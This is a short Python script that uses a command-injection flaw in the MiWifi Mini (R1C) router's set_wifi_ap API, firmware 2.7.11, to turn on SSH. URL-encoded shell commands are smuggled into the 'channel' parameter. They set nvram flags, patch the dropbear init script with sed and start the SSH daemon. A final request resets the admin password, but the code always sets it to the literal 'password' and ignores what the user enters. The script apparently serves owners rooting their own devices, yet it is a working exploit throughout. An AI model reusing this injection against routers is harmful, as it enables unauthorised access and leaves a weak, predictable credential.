#!/usr/bin/env python3
# coding=utf-8

# Only Support miwifi ROM verison:2.7.11
# Miwifi v2.7.11 ROM download url https://bigota.miwifi.com/xiaoqiang/rom/r1cm/miwifi_r1cm_firmware_b9d56_2.7.11.bin

import requests
import json

def getssh(host, stok, oldpwd, newpwd):
    newpwd = "password"
    urls = [
        f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit",
        f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bsed%20%2Di%20%22%3Ax%3AN%3As%2Fif%20%5C%5B%2E%2A%5C%3B%20then%5Cn%2E%2Areturn%200%5Cn%2E%2Afi%2F%23tb%2F%3Bb%20x%22%20%2Fetc%2Finit.d%2Fdropbear",
        f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3B%2Fetc%2Finit.d%2Fdropbear%20start",
        f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqsystem/set_name_password?oldPwd={oldpwd}&newPwd={newpwd}"
        ]
    for url in urls:
        print(url)
        f = requests.get(url)
        # print("status_code".center(50))
        # print(f.status_code)
        # print("headers".center(50))
        # print(f.headers)
        # print("text".center(50))
        result = json.loads(f.text)
        if (url == urls[-1]):
            if result['code'] == 0:
                print("SSH Open Success!")
            else :
                print("SSH Open Failed!")

    # {"msg":"未能连接到指定WiFi(Probe timeout)","code":1616} 字样，表示执行成功。  
    # {"msg":"未能连接到指定WiFi(Probe timeout)","code":1616} 字样，表示执行成功。
    # {"msg":"未能连接到指定WiFi(Probe timeout)","code":1616} 字样，表示执行成功。
    # {"code":0}字样，表示开启ssh成功！

if __name__ == "__main__":
    host = input("MiWifi Mini(R1C) IP Address: ")
    stok = input("MiWifi stok:")
    oldpwd = input("Current management password:")
    newpwd = input("Set New password:")
    getssh(host, stok, oldpwd, newpwd)